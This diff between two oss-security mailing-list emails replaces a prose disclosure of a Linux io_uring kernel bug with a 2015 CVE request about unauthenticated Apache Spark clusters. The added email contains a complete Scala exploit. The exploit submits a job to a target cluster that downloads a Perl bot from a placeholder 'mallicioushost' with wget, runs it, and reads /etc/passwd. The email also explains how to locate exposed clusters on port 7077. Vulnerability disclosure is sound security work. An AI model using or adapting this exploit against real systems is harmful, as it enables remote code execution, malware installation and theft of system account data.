@@ -1,4 +1,9 @@
-Received: (qmail 7693 invoked by uid 550); 24 May 2022 16:18:17 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2034" "Thursday" "16" "April" "2015" "23:49:17" "+0530" "Akhil Das" "akhil@sigmoidanalytics.com" "<CAHUQ+_bsF=VoOsFiF7jL4hzuJYU=E=XQW4z1SFHP5+mTubv+KA@mail.gmail.com>" "63" "[oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster" nil nil nil "4" "2015041618:19:17" "[oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster" (number mark "        akhil@sigmoi Apr 16   63/2034  " thread-indent "\"[oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 15908 invoked by uid 550); 16 Apr 2015 18:44:59 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,72 +11,90 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 32252 invoked from network); 24 May 2022 16:11:26 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=KNdF8gY/+3OcNB/uRoBMBwN9Iy1asfG5vW6SBmo9zVI=;
-        b=qtOMS4Pzv2Dth/mw239RA49kdEETZtygQZrXtVgc8WuhAFSvQANZARbJjFjLitNDP5
-         AlODXQPOaLWtf3WdhhWbyw5T/EAX9X5Yf+u5WTqIV1Od7mzCpsVTH/AuOx7Q1SfgkWXG
-         +Wp0BdKNAxCnVK5ng6pk9ErZSFQgb+OZ6I7Iq+OFvKdxfkuQEtY/S3HBb2R6rD0MkwWK
-         rqPIY9CxwY9MbXsFASwN6/e/kmi8H5JTZoZLV6dWh74IZchc6QHQjTCJo3uuER7BDnR4
-         CfwuPkiOqu8GqTwZjHLU3KS5mY2P0IF+7F/gfLBnOnLaNH8X+AY0ORlmvxI4EvUasSpf
-         14Gg==
+Received: (qmail 9791 invoked from network); 16 Apr 2015 18:19:29 -0000
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=KNdF8gY/+3OcNB/uRoBMBwN9Iy1asfG5vW6SBmo9zVI=;
-        b=rZuvt4VVUpTy6mRn6eUwKJ3vXWzxcLyg+4PK6VVrIkK+RtRGvRh3+Baqxu5omjfs/A
-         sdioEz/ydZ0K9BqwGb31r+K4dplPOOONP8Wu1EfTe6T//C/x3Nj2Kgs7XVsL+zgrHsnQ
-         tOaa51kDtaQ2uXDQR4zIc18/xhALuEze/MSjglSiXMwACJE4224JUoePYeovv174Q+z4
-         p3DHp47homcn66ueFC7jQ8jZkY7njZc1hogr9st7T+X7+l/DhsG3fEDxoNlK5EwT+OeN
-         B3hsnzR3XU5Y6B2kDM8GgasYHP5s1sa3gHswB9a3NP+BPAEEUXvwi2hbI4hcS/qA3Fa+
-         yNoQ==
-X-Gm-Message-State: AOAM533ueKCglpSvG+umEtQLvdstyACbSPsRZPKE72oA/pK6mgtcMBQk
-	93R7AcyE/D/nSI5Y9WaZAe+FD+bT168Jq1JzgHKA7UESoDeprA==
-X-Google-Smtp-Source: ABdhPJz2ayKHiP0PfQaYsh9UHUg/x+ZERQLyTU69WReRSPu0KY/Bo8AB086gm5S07+OG5PPYTSx7G1/E2lXsPcBwbFc=
-X-Received: by 2002:a65:554d:0:b0:3c6:3f22:72cd with SMTP id
- t13-20020a65554d000000b003c63f2272cdmr24756053pgr.283.1653408673924; Tue, 24
- May 2022 09:11:13 -0700 (PDT)
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
+         :content-type;
+        bh=t3YgaL8G/5mnQ3T0Uari3EohBQJ2CypBP9j6+4Kq4RU=;
+        b=EjqirNv9/i0y7tHOl4uG/qysG8JS0/5xYQ/LRdWCNNkp4Iemff1PRbbing6M4Y3d1T
+         wxphMqEo8hwTKK/ag9vzgwqaGjI3Sg+R0sIm4kaBUGO0nHHS35eH4+IaDgXsybxsS21C
+         5k+i10AE55XU+52AKDb8Js4kBCVhGuwcxMqrq37Tgzx687TtZaZoXEBWWLFPlMxsvQOr
+         lmAjKGy/H8uvICj3uteI6bs1pJhZqWXC49CVKe/ZCpOeaJvHRzTryjTNIjkZHvQoEb9S
+         X4lThswavjDVH8z9ccivDHQxRWcxka5Ui31kBBABkQtYOEyQYIJ1BxeI6DhTAtIepMiL
+         jrGA==
+X-Gm-Message-State: ALoCoQk0rhJXsKFiZjGZ6MkgKK3qXn0HU5rwzPe5csdOvvsXc2uVyT2D69hMHDyBbwUIjwBGUnkO
 MIME-Version: 1.0
-From: Kyle Zeng <zengyhkyle@gmail.com>
-Date: Tue, 24 May 2022 09:10:37 -0700
-Message-ID: <CADW8OBs7P=YE_xfYCX3KuhaiVkwjSTMVUjLX93S_bn_XBd05EQ@mail.gmail.com>
+X-Received: by 10.42.52.4 with SMTP id h4mr39952149icg.32.1429208357989; Thu,
+ 16 Apr 2015 11:19:17 -0700 (PDT)
+Message-ID: <CAHUQ+_bsF=VoOsFiF7jL4hzuJYU=E=XQW4z1SFHP5+mTubv+KA@mail.gmail.com>
+Content-Type: multipart/alternative; boundary=485b397dd43d7d06270513db8057
+Date: Thu, 16 Apr 2015 23:49:17 +0530
+From: Akhil Das <akhil@sigmoidanalytics.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE Request: Arbitary Code Execution in Apache Spark Cluster
 To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Subject: [oss-security] CVE-2022-1786: Linux Kernel invalid-free in io_uring
 
-Hi there,
+--485b397dd43d7d06270513db8057
+Content-Type: text/plain; charset=UTF-8
 
-I recently found a severe invalid-free bug in the io_uring subsystem
-which affects Linux kernel v5.10. It has been demonstrated that the
-vulnerability can be exploited to achieve local privilege escalation.
+# *Vendor Homepage*: https://spark.apache.org/
+# *Software Link*: https://spark.apache.org/downloads.html
+# *Version*: All (0.0.x, 1.1.x, 1.2.x, 1.3.x)
+# *Tested on*: 1.2.1
 
-# Root Cause
-The root cause of the bug is a misuse of the identity model in
-io_uring. When preparing a request, the kernel uses the identity of
-the current task instead of that of the request task, which causes
-type confusion and invalid-free when the request needs to be
-destroyed.
+# Reference(s) :
+http://codebreach.in/blog/2015/03/arbitary-code-execution-in-unsecured-apache-spark-cluster/
+# Exploit URL  : https://github.com/akhld/spark-exploit/
 
-# Impact
-I wrote a proof-of-concept exploit and demonstrated that it can be
-used to achieve local privilege escalation.
+# Spark clusters which are not secured with proper firewall can be taken
+over easily (Since it does not have
+# any authentication mechanism), this exploit simply runs arbitarty codes
+over the cluster.
+# All you have to do is, find a vulnerable Spark cluster (usually runs on
+port 7077) add that host to your
+# hosts list so that your system will recognize it (here its
+spark-b-akhil-master pointing
+# to 54.155.61.87 in my /etc/hosts) and submit your Spark Job with arbitary
+codes that you want to execute.
 
-# Affected Versions
-To the best of my knowledge, this bug only affects Linux kernel v5.10
-and v5.11 because of their unique identity model in io_uring. But it
-still affects many users because of some widely used vendors (Android
-12, ChromeOS, etc).
+# Language: Scala
 
-# Disclosure & Patch
-I already contacted the Linux security team and prepared a patch. The
-patch has been merged into the Linux kernel stable tree and it can be
-found here: https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?h=linux-5.10.y&id=29f077d070519a88a793fbc70f1e6484dc6d9e35.
 
-I also informed the vendors and gave enough time for them to patch the
-bug before this public disclosure.
+import org.apache.spark.{SparkContext, SparkConf}
 
---
-Kyle Zeng
+/**
+ * Created by akhld on 23/3/15.
+ */
+
+object Exploit {
+  def main(arg: Array[String]) {
+    val sconf = new SparkConf()
+      .setMaster("spark://spark-b-akhil-master:7077") // Set this to the
+vulnerable host URI
+      .setAppName("Exploit")
+      .set("spark.cores.max", "2")
+      .set("spark.executor.memory", "2g")
+      .set("spark.driver.host","hacked.work") // Set this to your host from
+where you launch the attack
+
+    val sc = new SparkContext(sconf)
+      sc.addJar("target/scala-2.10/spark-exploit_2.10-1.0.jar")
+
+    val exploit = sc.parallelize(1 to 1).map(x=>{
+       //Replace these with whatever you want to get executed
+       val x = "wget https://mallicioushost/mal.pl -O bot.pl".!
+       val y = "perl bot.pl".!
+       scala.io.Source.fromFile("/etc/passwd").mkString
+    })
+    exploit.collect().foreach(println)
+  }
+}
+
+
+
+
+Please see this blog post if you need anymore information on this
+http://codebreach.in/blog/2015/03/arbitary-code-execution-in-unsecured-apache-spark-cluster/
+
+--485b397dd43d7d06270513db8057--
